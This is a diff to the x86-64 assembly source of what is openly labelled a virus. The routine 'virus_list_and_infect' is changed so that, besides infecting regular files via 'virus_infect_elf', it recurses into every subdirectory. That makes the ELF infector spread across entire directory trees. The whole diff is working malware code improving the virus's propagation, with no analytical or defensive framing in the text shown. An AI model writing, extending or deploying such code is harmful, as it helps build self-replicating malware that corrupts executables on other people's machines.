@@ -510,11 +510,10 @@ virus_list_and_infect:
     je .vl_next_entry
 
 .vl_not_dot:
-    ; Check if regular file (DT_REG = 8)
-    cmp al, 8
-    jne .vl_next_entry
-
-    ; Build full path
+    ; Save d_type for later use
+    mov [rbp-40], rax           ; save d_type
+    
+    ; Build full path (needed for both files and directories)
     mov rdi, r12
     mov rax, [rbp-8]            ; path length
     add rdi, rax
@@ -530,10 +529,33 @@ virus_list_and_infect:
     call virus_str_copy
     pop rdi
 
+    ; Restore d_type
+    mov rax, [rbp-40]
+    
+    ; Check if regular file (DT_REG = 8)
+    cmp al, 8
+    je .vl_regular_file
+    
+    ; Check if directory (DT_DIR = 4)
+    cmp al, 4
+    je .vl_directory
+    
+    jmp .vl_restore_path
+
+.vl_regular_file:
     ; Try to infect this file
     mov rdi, r12
     call virus_infect_elf
+    jmp .vl_restore_path
 
+.vl_directory:
+    ; Recurse into directory
+    mov rdi, r12
+    mov rsi, r13
+    mov rdx, r14
+    call virus_list_and_infect
+
+.vl_restore_path:
     ; Restore path
     mov rax, [rbp-8]
     mov byte [r12 + rax], 0
